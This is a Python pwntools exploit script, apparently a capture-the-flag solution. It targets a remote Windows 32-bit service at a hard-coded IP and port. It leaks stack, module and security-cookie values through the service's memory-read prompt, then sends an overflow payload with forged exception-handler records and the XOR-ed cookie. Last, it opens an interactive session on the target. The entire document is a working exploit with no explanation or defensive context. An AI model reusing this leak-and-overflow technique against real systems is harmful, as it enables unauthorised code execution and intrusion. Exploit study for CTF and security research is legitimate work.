from pwn import *
main_aslr = 0x1c395e
main_addr = 0x0040395E
cookie_addr = 0x0047C004
stack_addr = 0x19FF10

def leak_stack(stack):
    p.recvuntil("Do you want to know more?")
    p.sendline("yes")
    p.recvuntil("Where do you want to know?")
    p.sendline(str(stack-stack_addr+stack_aslr))
    p.recvuntil("value is ")
    s = p.recvline().strip()
    s = eval(s)
    return s
cookie_aslr = cookie_addr-main_addr+main_aslr
p = remote("121.40.159.66","6666")
p.recvuntil("stack address = ")
stack_aslr = eval(p.recv(8))
log.success("stack:0x%x"%stack_aslr)
p.recvuntil("main address = ")
main_aslr = eval(p.recv(8))
log.success("main:0x%x"%main_aslr)
str4_addr = 0x0019FE48-stack_addr+stack_aslr
p.recvuntil("So,Can You Tell me what did you know?")
p.sendline("00408541")
p.recvuntil("Do you want to know more?")
p.sendline("yes")
p.recvuntil("Where do you want to know?")
p.sendline(str(cookie_aslr))
p.recvuntil("value is ")
cookie = p.recvline().strip()
cookie = eval(cookie)
log.success("cookie:0x%x"%cookie)
s1 = leak_stack(0x19fed4)
s4 = leak_stack(0x19fee0)
s5 = leak_stack(0x19fee4)
p.recvuntil("Do you want to know more?")
p.sendline("y")
payload = 'aaaa' + p32(0xffffffe4)+p32(0)+p32(0xffffff0c)+p32(0)+p32(0xfffffffe)+p32(0x408224-main_addr+main_aslr)+p32(0x00408266-main_addr+main_aslr)
payload = payload.ljust(144,"a") + p32(s1) + 'a'*8 + p32(s4) + p32(s5) + p32(cookie^str4_addr) + p32(0)
print(len(payload))
p.sendline(payload)
p.recvuntil("Do you want to know more?")
p.sendline("yes")
p.recvuntil("Where do you want to know?\r\n")
p.sendline("0")
p.interactive()
